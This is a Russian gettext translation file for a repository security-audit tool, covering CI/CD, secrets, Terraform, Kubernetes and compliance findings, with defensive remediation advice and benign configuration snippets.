"default — read and write on older repositories and organisations."
msgstr ""
"%(where)s не объявляет permissions, поэтому токен job получает права по "
"умолчанию для репозитория — чтение и запись в старых репозиториях и "
"организациях."

#: app/checks_cicd.py:292
msgid "Every workflow declares the permissions its token gets."
msgstr "Каждый workflow объявляет, какие права получает его токен."

#: app/checks_cicd.py:294
msgid "Workflow permissions are least-privilege"
msgstr "Права workflow по принципу минимальных привилегий"

#: app/checks_cicd.py:296
msgid ""
"Declare the minimum at the top of each workflow, and widen it only on the "
"job that needs more:\n"
"permissions:\n"
"  contents: read\n"
"  pull-requests: write  # only where it is actually used"
msgstr ""
"Объявите минимум в начале каждого workflow и расширяйте права только в той "
"job, которой нужно больше:\n"
"permissions:\n"
"  contents: read\n"
"  pull-requests: write  # только там, где реально используется"

#: app/checks_cicd.py:305
msgid "No self-hosted runners in a public repository"
msgstr "Нет self-hosted runners в публичном репозитории"

#: app/checks_cicd.py:307
#, python-format
msgid ""
"This repository is public and %(where)s runs on a self-hosted runner on an "
"event anyone can cause. A pull request from a fork can run arbitrary code on "
"that machine and stay on it."
msgstr ""
"Репозиторий публичный, а %(where)s запускается на self-hosted runner по "
"событию, которое может вызвать кто угодно. Pull request из форка может "
"выполнить произвольный код на этой машине и закрепиться на ней."

#: app/checks_cicd.py:311
msgid "No self-hosted runner can be started by someone outside the repository."
msgstr "Посторонний человек не может запустить ни один self-hosted runner."

#: app/checks_cicd.py:312
msgid ""
"Use GitHub-hosted runners for anything a fork can trigger. If a self-hosted "
"runner is unavoidable, make it ephemeral (--ephemeral), put it in a runner "
"group restricted to private repositories, and require approval for fork pull "
"requests."
msgstr ""
"Для всего, что может запустить форк, используйте GitHub-hosted runners. Если "
"без self-hosted runner не обойтись — сделайте его одноразовым (--ephemeral), "
"поместите в runner group, доступную только приватным репозиториям, и "
"требуйте одобрения для pull request из форков."

#: app/checks_cicd.py:318 app/checks_cicd.py:478
msgid "Cloud deploys use short-lived credentials (OIDC)"
msgstr "Деплой в облако использует краткоживущие учётные данные (OIDC)"

#: app/checks_cicd.py:320
#, python-format
msgid ""
"%(where)s deploys with a long-lived cloud key stored as a secret. It works "
"until someone leaks it, and then it works for them."
msgstr ""
"%(where)s деплоит с долгоживущим облачным ключом, сохранённым в секретах. Он "
"работает, пока не утечёт, — а потом работает на того, к кому утёк."

#: app/checks_cicd.py:323
msgid ""
"Cloud access from workflows uses OpenID Connect instead of a stored key."
msgstr ""
"Доступ к облаку из workflow идёт через OpenID Connect, а не через "
"сохранённый ключ."

#: app/checks_cicd.py:324
msgid "Let the cloud trust GitHub's OIDC token instead of storing a key:"
msgstr "Настройте облако доверять OIDC-токену GitHub вместо хранения ключа:"

#: app/checks_cicd.py:331 app/checks_cicd.py:492
msgid "Then delete the stored key and revoke it."
msgstr "Затем удалите сохранённый ключ и отзовите его."

#: app/checks_cicd.py:334
msgid "No workflow authenticates to a cloud provider."
msgstr "Ни один workflow не авторизуется у облачного провайдера."

#: app/checks_cicd.py:381 app/checks_cicd.py:386
#, python-format
msgid "remote %(url)s"
msgstr "remote %(url)s"

#: app/checks_cicd.py:390
#, python-format
msgid "project %(project)s with no ref"
msgstr "project %(project)s без ref"

#: app/checks_cicd.py:392
#, python-format
msgid "project %(project)s at branch %(ref)s"
msgstr "project %(project)s на ветке %(ref)s"

#: app/checks_cicd.py:397
#, python-format
msgid "component %(c)s"
msgstr "component %(c)s"

#: app/checks_cicd.py:449
msgid "GitLab CI includes are pinned"
msgstr "include в GitLab CI закреплены"

#: app/checks_cicd.py:450
#, python-format
msgid ""
"The pipeline pulls in configuration that can change under it: %(what)s. "
"Whoever controls that file controls what your jobs run."
msgstr ""
"Pipeline подтягивает конфигурацию, которая может измениться без вашего "
"ведома: %(what)s. Кто контролирует этот файл, тот контролирует, что "
"выполняют ваши jobs."

#: app/checks_cicd.py:454
msgid ""
"Every included pipeline file is local, a GitLab template, or pinned to a "
"version."
msgstr ""
"Каждый подключённый файл pipeline — локальный, шаблон GitLab или закреплён "
"на версии."

#: app/checks_cicd.py:455
msgid "Pin every include to something that cannot move:"
msgstr "Закрепите каждый include на том, что не может сдвинуться:"

#: app/checks_cicd.py:465
msgid "GitLab CI images are pinned"
msgstr "Образы в GitLab CI закреплены"

#: app/checks_cicd.py:466
#, python-format
msgid ""
"%(n)d job image(s) have no tag or use :latest, for example %(sample)s. Every "
"pipeline run can pull a different image."
msgstr ""
"У образов job (%(n)d) нет тега или используется :latest, например "
"%(sample)s. Каждый запуск pipeline может скачать другой образ."

#: app/checks_cicd.py:470
msgid "Every job image and service names a tag or a digest."
msgstr "У каждого образа job и service указан тег или digest."

#: app/checks_cicd.py:471
msgid "Name an exact version, or better a digest:"
msgstr "Укажите точную версию, а лучше digest:"

#: app/checks_cicd.py:474
msgid "Renovate can keep either up to date."
msgstr "Renovate может поддерживать актуальность и того, и другого."

#: app/checks_cicd.py:480
#, python-format
msgid ""
"%(where)s deploys with a long-lived cloud key stored as a CI/CD variable. It "
"works until someone leaks it, and then it works for them."
msgstr ""
"%(where)s деплоит с долгоживущим облачным ключом, сохранённым в переменной "
"CI/CD. Он работает, пока не утечёт, — а потом работает на того, к кому утёк."

#: app/checks_cicd.py:484
msgid ""
"Cloud access from the pipeline uses OpenID Connect instead of a stored key."
msgstr ""
"Доступ к облаку из pipeline идёт через OpenID Connect, а не через "
"сохранённый ключ."

#: app/checks_cicd.py:485
msgid "Let the cloud trust GitLab's ID token instead of storing a key:"
msgstr "Настройте облако доверять ID-токену GitLab вместо хранения ключа:"

#: app/checks_cicd.py:495
msgid "The pipeline does not authenticate to a cloud provider."
msgstr "Pipeline не авторизуется у облачного провайдера."

#: app/checks_extra.py:187 app/checks_extra.py:226
msgid "Known vulnerabilities in dependencies"
msgstr "Известные уязвимости в зависимостях"

#: app/checks_extra.py:188
#, python-format
msgid "Checked %(n)d dependencies against OSV.dev — no known vulnerabilities."
msgstr ""
"Проверено %(n)d зависимостей по базе OSV.dev — известных уязвимостей нет."

#: app/checks_extra.py:198
#, python-format
msgid " and %(n)d more"
msgstr " и ещё %(n)d"

#: app/checks_extra.py:202
#, python-format
msgid ""
"%(vuln)d of %(scanned)d dependencies have known vulnerabilities (%(crit)d "
"critical, %(high)d high) according to OSV.dev."
msgstr ""
"У %(vuln)d из %(scanned)d зависимостей есть известные уязвимости "
"(критических: %(crit)d, высоких: %(high)d) по данным OSV.dev."

#: app/checks_extra.py:205
#, python-format
msgid " Examples: %(ids)s."
msgstr " Примеры: %(ids)s."

#: app/checks_extra.py:209
#, python-format
msgid ""
"%(n)d of them are not imported anywhere in the code and count one level "
"lower: %(pkgs)s. This is a heuristic — we read import statements and tool "
"configs, not the call graph, and a package another dependency loads can "
"still run."
msgstr ""
"Из них %(n)d нигде в коде не импортируются и учтены на уровень ниже: "
"%(pkgs)s. Это эвристика — мы читаем импорты и конфиги инструментов, а не "
"граф вызовов, и пакет, который загружает другая зависимость, всё равно может "
"выполняться."

#: app/checks_extra.py:232
#, python-format
msgid "Upgrade the affected packages: %(pkgs)s."
msgstr "Обновите затронутые пакеты: %(pkgs)s."

#: app/checks_extra.py:233
msgid "Get the full list locally:"
msgstr "Полный список локально:"

#: app/checks_extra.py:238
msgid ""
"Then turn on Dependabot or Renovate so the next patch arrives as a pull "
"request."
msgstr ""
"Затем включите Dependabot или Renovate, чтобы следующий патч приходил как "
"pull request."

#: app/checks_extra.py:296
msgid "Kubernetes: pods declare resource limits"
msgstr "Kubernetes: у подов заданы лимиты ресурсов"

#: app/checks_extra.py:298
msgid ""
"Pods without resource limits can exhaust the node and take neighbouring "
"services down."
msgstr ""
"Поды без лимитов ресурсов могут исчерпать ноду и уронить соседние сервисы."

#: app/checks_extra.py:299
msgid "Resource limits are declared on the workloads."
msgstr "Лимиты ресурсов заданы для рабочих нагрузок."

#: app/checks_extra.py:303
msgid ""
"Add to every container spec:\n"
"resources:\n"
"  requests:\n"
"    memory: \"128Mi\"\n"
"    cpu: \"100m\"\n"
"  limits:\n"
"    memory: \"256Mi\"\n"
"    cpu: \"500m\""
msgstr ""
"Добавьте в spec каждого контейнера:\n"
"resources:\n"
"  requests:\n"
"    memory: \"128Mi\"\n"
"    cpu: \"100m\"\n"
"  limits:\n"
"    memory: \"256Mi\"\n"
"    cpu: \"500m\""

#: app/checks_extra.py:320
msgid "Kubernetes: containers run without root privileges"
msgstr "Kubernetes: контейнеры без root-привилегий"

#: app/checks_extra.py:322
msgid "privileged: true found — the container has full access to the node. "
msgstr "Обнаружен privileged: true — контейнер имеет полный доступ к ноде. "

#: app/checks_extra.py:323
msgid "runAsNonRoot is not set."
msgstr "runAsNonRoot не задан."

#: app/checks_extra.py:325
msgid "securityContext is set for non-root execution."
msgstr "securityContext настроен на запуск не от root."

#: app/checks_extra.py:331
msgid ""
"In the pod and container securityContext:\n"
"securityContext:\n"
"  runAsNonRoot: true\n"
"  runAsUser: 1000\n"
"  allowPrivilegeEscalation: false\n"
"  readOnlyRootFilesystem: true"
msgstr ""
"В securityContext пода и контейнера:\n"
"securityContext:\n"
"  runAsNonRoot: true\n"
"  runAsUser: 1000\n"
"  allowPrivilegeEscalation: false\n"
"  readOnlyRootFilesystem: true"

#: app/checks_extra.py:346
msgid "Kubernetes: liveness and readiness probes"
msgstr "Kubernetes: liveness- и readiness-пробы"

#: app/checks_extra.py:348
msgid "livenessProbe is missing — a hung pod will never be restarted. "
msgstr "livenessProbe отсутствует — зависший под никогда не перезапустится. "

#: app/checks_extra.py:349
msgid "readinessProbe is missing — traffic will reach a pod that is not ready."
msgstr "readinessProbe отсутствует — трафик пойдёт на неготовый под."

#: app/checks_extra.py:351
msgid "Liveness and readiness probes are configured."
msgstr "Liveness- и readiness-пробы настроены."

#: app/checks_extra.py:355
msgid ""
"Add to the container spec:\n"
"readinessProbe:\n"
"  httpGet:\n"
"    path: /health\n"
"    port: 8080\n"
"  initialDelaySeconds: 5\n"
"  periodSeconds: 10\n"
"livenessProbe:\n"
"  httpGet:\n"
"    path: /health\n"
"    port: 8080\n"
"  initialDelaySeconds: 15\n"
"  periodSeconds: 30"
msgstr ""
"Добавьте в spec контейнера:\n"
"readinessProbe:\n"
"  httpGet:\n"
"    path: /health\n"
"    port: 8080\n"
"  initialDelaySeconds: 5\n"
"  periodSeconds: 10\n"
"livenessProbe:\n"
"  httpGet:\n"
"    path: /health\n"
"    port: 8080\n"
"  initialDelaySeconds: 15\n"
"  periodSeconds: 30"

#: app/checks_extra.py:418 app/checks_extra.py:426
msgid "Observability tooling is wired in"
msgstr "Подключены инструменты наблюдаемости"

#: app/checks_extra.py:419
#, python-format
msgid "Found: %(tools)s."
msgstr "Обнаружено: %(tools)s."

#: app/checks_extra.py:428
msgid ""
"No monitoring library found. Without one, you learn about incidents from "
"your users."
msgstr ""
"Библиотек мониторинга не найдено. Без них об инцидентах вы узнаёте от "
"пользователей."

#: app/checks_extra.py:432
msgid ""
"Add the three signals:\n"
"• Errors:  sentry-sdk\n"
"• Metrics: prometheus-client plus a /metrics endpoint\n"
"• Traces:  opentelemetry-sdk\n"
"• Logs:    structlog or loguru for structured JSON output"
msgstr ""
"Подключите три сигнала:\n"
"• Ошибки:  sentry-sdk\n"
"• Метрики: prometheus-client и эндпоинт /metrics\n"
"• Трейсы:  opentelemetry-sdk\n"
"• Логи:    structlog или loguru для структурированного JSON"

#: app/checks_iac.py:53
msgid "all ports"
msgstr "все порты"

#: app/checks_iac.py:78
msgid "Terraform state is remote and locked"
msgstr "Состояние Terraform хранится удалённо и с блокировкой"

#: app/checks_iac.py:79
msgid ""
"Local state means no team can apply safely — two people applying at once "
"corrupt it, and the file usually holds secrets in plain text."
msgstr ""
"Локальный state означает, что команда не может безопасно применять "
"изменения: два одновременных apply его портят, а сам файл обычно содержит "
"секреты открытым текстом."

#: app/checks_iac.py:81
msgid "Remote backend with state locking is configured."
msgstr "Настроен удалённый backend с блокировкой состояния."

#: app/checks_iac.py:84
msgid ""
"Configure a remote backend with locking:\n"
"terraform {\n"
"  backend \"s3\" {\n"
"    bucket         = \"my-tf-state\"\n"
"    key            = \"prod/terraform.tfstate\"\n"
"    region         = \"eu-central-1\"\n"
"    dynamodb_table = \"tf-state-lock\"\n"
"    encrypt        = true\n"
"  }\n"
"}"
msgstr ""
"Настройте удалённый backend с блокировкой:\n"
"terraform {\n"
"  backend \"s3\" {\n"
"    bucket         = \"my-tf-state\"\n"
"    key            = \"prod/terraform.tfstate\"\n"
"    region         = \"eu-central-1\"\n"
"    dynamodb_table = \"tf-state-lock\"\n"
"    encrypt        = true\n"
"  }\n"
"}"

#: app/checks_iac.py:94
msgid "No sensitive ports open to the internet"
msgstr "Чувствительные порты не открыты в интернет"

#: app/checks_iac.py:95
#, python-format
msgid ""
"Ingress from 0.0.0.0/0 reaches: %(ports)s. These are scanned continuously by "
"bots."
msgstr ""
"Доступ с 0.0.0.0/0 открыт к: %(ports)s. Эти порты постоянно сканируют боты."

#: app/checks_iac.py:97
msgid "No sensitive port is reachable from 0.0.0.0/0."
msgstr "С 0.0.0.0/0 не доступен ни один чувствительный порт."

#: app/checks_iac.py:99
msgid ""
"Restrict cidr_blocks to your VPC or office ranges, and reach admin ports "
"through a bastion host or SSM Session Manager instead of exposing them."
msgstr ""
"Ограничьте cidr_blocks диапазонами VPC или офиса, а к админ-портам ходите "
"через bastion-хост или SSM Session Manager, а не открывая их наружу."

#: app/checks_iac.py:120
msgid "Storage is encrypted at rest"
msgstr "Хранилище шифруется на диске"

#: app/checks_iac.py:121
#, python-format
msgid "Encryption at rest is not configured for: %(what)s."
msgstr "Шифрование на диске не настроено для: %(what)s."

#: app/checks_iac.py:122
msgid "Encryption at rest is configured for the storage resources found."
msgstr "Шифрование на диске настроено для найденных хранилищ."

#: app/checks_iac.py:124
msgid ""
"Set storage_encrypted = true on RDS, encrypted = true on EBS volumes, and "
"add an aws_s3_bucket_server_side_encryption_configuration resource for each "
"bucket."
msgstr ""
"Укажите storage_encrypted = true для RDS, encrypted = true для томов EBS и "
"добавьте ресурс aws_s3_bucket_server_side_encryption_configuration для "
"каждого бакета."

#: app/checks_iac.py:133
msgid "Databases are not publicly accessible"
msgstr "Базы данных недоступны публично"

#: app/checks_iac.py:134
msgid ""
"A managed database has publicly_accessible = true — it is reachable from the "
"open internet."
msgstr ""
"У управляемой базы данных publicly_accessible = true — она доступна из "
"открытого интернета."

#: app/checks_iac.py:135
msgid "Databases are confined to private subnets."
msgstr "Базы данных размещены в приватных подсетях."

#: app/checks_iac.py:137
msgid ""
"Set publicly_accessible = false and place the instance in private subnets. "
"Reach it through a bastion host or VPN."
msgstr ""
"Поставьте publicly_accessible = false и разместите инстанс в приватных "
"подсетях. Доступ — через bastion-хост или VPN."

#: app/checks_iac.py:146
msgid "No publicly readable object storage"
msgstr "Нет публично читаемых хранилищ объектов"

#: app/checks_iac.py:147
msgid ""
"A bucket is declared with a public-read ACL. Public buckets are the single "
"most common source of accidental data exposure."
msgstr ""
"Бакет объявлен с ACL public-read. Публичные бакеты — самая частая причина "
"случайной утечки данных."

#: app/checks_iac.py:149
msgid "No bucket grants public access."
msgstr "Ни один бакет не даёт публичный доступ."

#: app/checks_iac.py:151
msgid ""
"Remove the public ACL and add an aws_s3_bucket_public_access_block with all "
"four settings set to true. Serve public objects through CloudFront instead."
msgstr ""
"Уберите публичный ACL и добавьте aws_s3_bucket_public_access_block со всеми "
"четырьмя параметрами true. Публичные объекты раздавайте через CloudFront."

#: app/checks_iac.py:161
msgid "No provider credentials hardcoded in Terraform"
msgstr "В Terraform нет захардкоженных учётных данных провайдера"

#: app/checks_iac.py:162
msgid ""
"Credentials are assigned as literals in .tf files, which puts them in git "
"history."
msgstr ""
"Учётные данные заданы литералами в .tf-файлах — значит, они попали в историю "
"git."

#: app/checks_iac.py:163
msgid "Credentials come from variables or the environment."
msgstr "Учётные данные берутся из переменных или окружения."

#: app/checks_iac.py:165
msgid ""
"Move them to variables sourced from the environment (TF_VAR_*), or to a "
"secret manager data source. Never commit a .tfvars file holding real values."
msgstr ""
"Перенесите их в переменные из окружения (TF_VAR_*) или в data source секрет-"
"менеджера. Никогда не коммитьте .tfvars с реальными значениями."

#: app/checks_iac.py:173
msgid "Provider versions are constrained"
msgstr "Версии провайдеров ограничены"

#: app/checks_iac.py:174
msgid ""
"Without required_providers version constraints, a plan can silently change "
"behaviour when a new provider release lands."
msgstr ""
"Без ограничений версий в required_providers план может молча изменить "
"поведение после выхода новой версии провайдера."

#: app/checks_iac.py:176
msgid "Provider versions are constrained."
msgstr "Версии провайдеров ограничены."

#: app/checks_iac.py:178
msgid ""
"Add:\n"
"terraform {\n"
"  required_version = \">= 1.6\"\n"
"  required_providers {\n"
"    aws = {\n"
"      source  = \"hashicorp/aws\"\n"
"      version = \"~> 5.0\"\n"
"    }\n"
"  }\n"
"}"
msgstr ""
"Добавьте:\n"
"terraform {\n"
"  required_version = \">= 1.6\"\n"
"  required_providers {\n"
"    aws = {\n"
"      source  = \"hashicorp/aws\"\n"
"      version = \"~> 5.0\"\n"
"    }\n"
"  }\n"
"}"

#: app/checks_iac.py:191
msgid "Terraform is scanned in CI"
msgstr "Terraform сканируется в CI"

#: app/checks_iac.py:192
msgid ""
"An IaC scanner catches a misconfigured resource in review, not after it is "
"live."
msgstr ""
"IaC-сканер ловит неверно настроенный ресурс на ревью, а не после выката."

#: app/checks_iac.py:194
msgid ""
"Add Checkov or tfsec to the pipeline:\n"
"- run: pip install checkov && checkov -d . --quiet --compact"
msgstr ""
"Добавьте Checkov или tfsec в пайплайн:\n"
"- run: pip install checkov && checkov -d . --quiet --compact"

#: app/checks_secrets.py:282
#, python-format
msgid "Found %(count)d credential(s) committed to the repository: %(sample)s"
msgstr "Найдено учётных данных в репозитории: %(count)d — %(sample)s"

#: app/checks_secrets.py:286 app/checks_secrets.py:396
#: app/checks_secrets.py:425
#, python-format
msgid " and %(n)d more."
msgstr " и ещё %(n)d."

#: app/checks_secrets.py:288
msgid ""
"Treat every value found as compromised and rotate it now — removing the line "
"is not enough, it stays in git history.\n"
"1. Rotate the credential at the provider.\n"
"2. Move it to an environment variable or a secret manager.\n"
"3. Purge it from history with git-filter-repo or BFG.\n"
"4. Add a pre-commit hook (gitleaks or detect-secrets) so the next one never "
"lands."
msgstr ""
"Считайте каждое найденное значение скомпрометированным и смените его сейчас "
"— удалить строку недостаточно, она остаётся в истории git.\n"
"1. Смените учётные данные на стороне провайдера.\n"
"2. Перенесите их в переменную окружения или секрет-менеджер.\n"
"3. Вычистите из истории через git-filter-repo или BFG.\n"
"4. Поставьте pre-commit хук (gitleaks или detect-secrets), чтобы следующий "
"секрет не попал в репозиторий."

#: app/checks_secrets.py:298
#, python-format
msgid ""
"No credentials found in the repository source. %(count)d key file(s) sit "
"under a test or example path and are read as fixtures: %(sample)s"
msgstr ""
"Учётных данных в исходниках не найдено. %(count)d файл(ов) с ключами лежит "
"по тестовым или примерным путям и считается фикстурами: %(sample)s"

#: app/checks_secrets.py:302
msgid ""
"Nothing to do if these are throwaway test keys. If any of them is also used "
"outside the test suite, rotate it and move it to a secret manager."
msgstr ""
"Если это одноразовые тестовые ключи — делать ничего не нужно. Если какой-то "
"из них используется и вне тестов, смените его и перенесите в менеджер "
"секретов."

#: app/checks_secrets.py:307
msgid "No credentials found in the repository source."
msgstr "Учётных данных в исходном коде не найдено."

#: app/checks_secrets.py:316
msgid "No secrets committed to the repository"
msgstr "В репозитории нет закоммиченных секретов"

#: app/checks_secrets.py:341
msgid ".env file is not committed"
msgstr "Файл .env не закоммичен"

#: app/checks_secrets.py:342
#, python-format
msgid ""
"%(path)s is tracked in git — every value it holds is exposed to anyone with "
"repository access."
msgstr ""
"%(path)s отслеживается git — все его значения доступны каждому, у кого есть "
"доступ к репозиторию."

#: app/checks_secrets.py:344
msgid "No .env file is tracked in the repository."
msgstr "Файл .env не отслеживается в репозитории."

#: app/checks_secrets.py:346
msgid ""
"Delete the file from the repository (`git rm --cached .env`), rotate every "
"value it contained, and add `.env` to .gitignore."
msgstr ""
"Удалите файл из репозитория (`git rm --cached .env`), смените все значения, "
"которые в нём были, и добавьте `.env` в .gitignore."

#: app/checks_secrets.py:355
#, python-format
msgid "%(label)s in %(file)s"
msgstr "%(label)s в %(file)s"

#: app/checks_secrets.py:357
#, python-format
msgid "(commit %(commit)s, %(date)s)"
msgstr "(коммит %(commit)s, %(date)s)"

#: app/checks_secrets.py:365
#, python-format
msgid ""
"Checked with the provider: %(active)d still working, %(inactive)d rejected, "
"%(unknown)d could not be checked."
msgstr ""
"Проверено у провайдера: действуют — %(active)d, отклонены — %(inactive)d, "
"проверить не удалось — %(unknown)d."

#: app/checks_secrets.py:370
msgid "The repository is too large to scan its full git history."
msgstr "Репозиторий слишком большой, чтобы просканировать всю историю git."

#: app/checks_secrets.py:371
msgid ""
"Git history cannot be read for this connection (a GitLab instance behind a "
"custom DNS server)."
msgstr ""
"Историю git не удаётся прочитать для этого подключения (GitLab за "
"собственным DNS-сервером)."

#: app/checks_secrets.py:373
msgid "Reading the git history took too long and was stopped."
msgstr "Чтение истории git заняло слишком много времени и было остановлено."

#: app/checks_secrets.py:374 app/checks_secrets.py:375
msgid "The git history could not be downloaded this time."
msgstr "Историю git не удалось загрузить в этот раз."

#: app/checks_secrets.py:384 app/checks_secrets.py:387
#: app/checks_secrets.py:404
msgid "No secrets in git history"
msgstr "В истории git нет секретов"

#: app/checks_secrets.py:388
#, python-format
msgid ""
"No credentials found anywhere in the git history (%(n)d file versions read)."
msgstr ""
"Во всей истории git учётных данных не найдено (прочитано версий файлов: "
"%(n)d)."

#: app/checks_secrets.py:393
#, python-format
msgid "Found %(count)d credential(s) in the git history: %(sample)s"
msgstr "Найдено учётных данных в истории git: %(count)d — %(sample)s"

#: app/checks_secrets.py:398
#, python-format
msgid ""
"%(n)d of them were deleted from the code later, but every clone of the "
"repository still contains them."
msgstr ""
"Из них %(n)d позже удалены из кода, но остаются в каждом клоне репозитория."

#: app/checks_secrets.py:409
msgid ""
"Deleting the line does not remove the secret: the commit that added it is "
"still in every clone and fork.\n"
"1. Rotate each credential at the provider — this is the step that matters.\n"
"2. Only then rewrite history (git-filter-repo --replace-text, or BFG) and "
"force-push, and ask collaborators to re-clone.\n"
"3. Add a pre-commit hook (gitleaks or detect-secrets) so the next one never "
"lands."
msgstr ""
"Удаление строки не убирает секрет: коммит, который его добавил, остаётся в "
"каждом клоне и форке.\n"
"1. Смените каждый ключ у провайдера — именно этот шаг важен.\n"
"2. Только после этого перепишите историю (git-filter-repo --replace-text или "
"BFG), сделайте force-push и попросите коллег заново клонировать "
"репозиторий.\n"
"3. Поставьте pre-commit хук (gitleaks или detect-secrets), чтобы следующий "
"секрет не попал в репозиторий."

#: app/checks_secrets.py:422
#, python-format
msgid ""
"%(count)d credential(s) found in this repository still work — the provider "
"accepted them just now: %(sample)s"
msgstr ""
"Найденные в репозитории учётные данные всё ещё действуют (%(count)d) — "
"провайдер только что их принял: %(sample)s"

#: app/checks_secrets.py:428
msgid "No live credentials in the repository"
msgstr "В репозитории нет действующих ключей"

#: app/checks_secrets.py:433
msgid ""
"Anyone who has ever cloned this repository can use these keys today.\n"
"1. Revoke or rotate each one at the provider now, before anything else.\n"
"2. Check the provider's access logs for use you do not recognise.\n"
"3. Put the new value in a secret manager or CI secret, never in the "
"repository.\n"
"We checked with one read-only request per key (for example GitHub GET /user, "
"AWS sts:GetCallerIdentity) and stored only the result, never the key."
msgstr ""
"Любой, кто когда-либо клонировал этот репозиторий, может воспользоваться "
"этими ключами прямо сейчас.\n"
"1. Отзовите или смените каждый ключ у провайдера — прежде всего остального.\n"
"2. Проверьте журналы доступа провайдера на незнакомую активность.\n"
"3. Храните новое значение в секрет-менеджере или секретах CI, но не в "
"репозитории.\n"
"Мы проверили каждый ключ одним запросом только на чтение (например, GitHub "
"GET /user, AWS sts:GetCallerIdentity) и сохранили лишь результат, но не сам "
"ключ."

#: app/compliance.py:30
msgid ""
"Logical access security — restrict access to protected information assets"
msgstr ""
"Логический контроль доступа — ограничение доступа к защищаемым "
"информационным активам"

#: app/compliance.py:31
msgid ""
"Access is granted, modified and removed based on roles and least privilege"
msgstr ""
"Доступ выдаётся, изменяется и отзывается по ролям и принципу минимальных "
"привилегий"

#: app/compliance.py:32
msgid ""
"Logical access controls protect against threats from outside the system "
"boundary"
msgstr ""
"Средства логического контроля доступа защищают от угроз извне границы системы"

#: app/compliance.py:33
msgid "Transmission and storage of data is restricted and protected"
msgstr "Передача и хранение данных ограничены и защищены"

#: app/compliance.py:34
msgid "Controls prevent or detect unauthorised or malicious software"
msgstr "Меры предотвращают или выявляют несанкционированное и вредоносное ПО"

#: app/compliance.py:35
msgid "Configuration standards are defined and deviations are detected"
msgstr "Стандарты конфигурации определены, отклонения выявляются"

#: app/compliance.py:36
msgid "The system is monitored to detect anomalies and security events"
msgstr "Система мониторится для выявления аномалий и событий безопасности"

#: app/compliance.py:37
msgid ""
"Changes to infrastructure and software are authorised, designed, tested and "
"approved"
msgstr ""
"Изменения инфраструктуры и ПО санкционируются, проектируются, тестируются и "
"утверждаются"

#: app/compliance.py:38
msgid ""
"Relevant, quality information is generated and used to support internal "
"control"
msgstr ""
"Формируется и используется качественная информация для поддержки внутреннего "
"контроля"

#: app/compliance.py:39
msgid ""
"Environmental and recovery controls maintain processing capacity and "
"availability"
msgstr ""
"Средства защиты среды и восстановления поддерживают мощность обработки и "
"доступность"

#: app/compliance.py:41
msgid "Access control"
msgstr "Управление доступом"

#: app/compliance.py:42
msgid "Information security for use of cloud services"
msgstr "Информационная безопасность при использовании облачных сервисов"

#: app/compliance.py:43
msgid "Privileged access rights"
msgstr "Привилегированные права доступа"

#: app/compliance.py:44
msgid "Management of technical vulnerabilities"
msgstr "Управление техническими уязвимостями"

#: app/compliance.py:45
msgid "Configuration management"
msgstr "Управление конфигурацией"

#: app/compliance.py:46
msgid "Monitoring activities"
msgstr "Деятельность по мониторингу"

#: app/compliance.py:47
msgid "Use of cryptography"
msgstr "Использование криптографии"

#: app/compliance.py:48
msgid "Secure development life cycle"
msgstr "Безопасный жизненный цикл разработки"

#: app/compliance.py:49
msgid "Secure coding"
msgstr "Безопасное программирование"

#: app/compliance.py:50
msgid "Separation of development, test and production environments"
msgstr "Разделение сред разработки, тестирования и продуктива"

#: app/compliance.py:51
msgid "Change management"
msgstr "Управление изменениями"

#: app/digest.py:74
#, python-format
msgid "Rotate the %(label)s found in %(file)s — it still works."
msgstr "Смените %(label)s, найденный в %(file)s, — он всё ещё действует."

#: app/digest.py:87
#, python-format
msgid "Read the %(label)s from the environment"
msgstr "Читать %(label)s из переменной окружения"

#: app/digest.py:115
#, python-format
msgid "Average score across %(n)d repositories: %(before)d → %(now)d."
msgstr "Средний балл по %(n)d репозиториям: %(before)d → %(now)d."

#: app/digest.py:118
#, python-format
msgid "Average score across %(n)d repositories: %(now)d."
msgstr "Средний балл по %(n)d репозиториям: %(now)d."

#: app/digest.py:121
#, python-format
msgid "%(n)d leaked key(s) still work and need rotating first."
msgstr ""
"Утёкших и всё ещё действующих ключей: %(n)d — их нужно сменить в первую "
"очередь."

#: app/digest.py:123
#, python-format
msgid "%(n)d repositories got worse this week."
msgstr "Репозиториев, которые ухудшились за неделю: %(n)d."

#: app/digest.py:125
msgid "Nothing got worse this week."
msgstr "За неделю ничего не ухудшилось."

#: app/digest.py:177
#, python-format
msgid "[DevOpsCheck] Weekly: %(n)d repositories, %(inc)d open incident(s)"
msgstr ""
"[DevOpsCheck] Неделя: репозиториев — %(n)d, открытых инцидентов — %(inc)d"

#: app/github_writer.py:47
msgid ""
"This repository is empty — it has no commits yet, so there is no branch to "
"open a pull request against. Push a first commit, then try again."
msgstr ""
"Репозиторий пуст — в нём ещё нет ни одного коммита, поэтому не от какой "
"ветки открыть pull request. Сделайте первый коммит и попробуйте снова."

#: app/gitlab_writer.py:56
msgid ""
"This project is empty — it has no commits yet, so there is no branch to open "
"a merge request against. Push a first commit, then try again."
msgstr ""
"Проект пуст — в нём ещё нет ни одного коммита, поэтому не от какой ветки "
"открыть merge request. Сделайте первый коммит и попробуйте снова."

#: app/guide.py:42
msgid "Connect a repository host"
msgstr "Подключите GitHub или GitLab"

#: app/guide.py:43
msgid ""
"Install the GitHub App or paste a token. Read access is enough to audit; "
"opening fix pull requests needs write."
msgstr ""
"Установите GitHub App или вставьте токен. Для аудита достаточно прав на "
"чтение; чтобы открывать пул-реквесты с исправлениями, нужна запись."

#: app/guide.py:46 app/templates/app/connect.html:694
#: app/templates/app/gitlab_dashboard.html:61
msgid "Connect"
msgstr "Подключить"

#: app/guide.py:51
msgid "Run your first audit"
msgstr "Запустите первый аудит"

#: app/guide.py:52
msgid ""
"Pick any repository and press \"run audit\". It reads the whole tree in "
"three API calls and takes a few seconds."
msgstr ""
"Выберите любой репозиторий и нажмите «запустить аудит». Он читает всё дерево "
"за три запроса к API и занимает несколько секунд."

#: app/guide.py:55
msgid "Open repositories"
msgstr "К репозиториям"

#: app/guide.py:60 app/guide.py:64 app/guide.py:73 app/guide.py:82
#: app/templates/app/landing.html:1089 app/templates/app/watch_status.html:56
msgid "Open the report"
msgstr "Откройте отчёт"

#: app/guide.py:61
msgid ""
"The score is the summary; the findings underneath are the work. They are "
"ordered worst first, so the top one is where to start."
msgstr ""
"Оценка — это итог, а работа — в находках под ней. Они отсортированы от "
"худшей, так что начинать надо сверху."

#: app/guide.py:69
msgid "Turn a finding into a pull request"
msgstr "Превратите находку в пул-реквест"

#: app/guide.py:70
msgid ""
"Press \"AI Fix\" on a finding that has one. You get the file, and a button "
"that opens the pull request on a branch — nothing is pushed to your default "
"branch."
msgstr ""
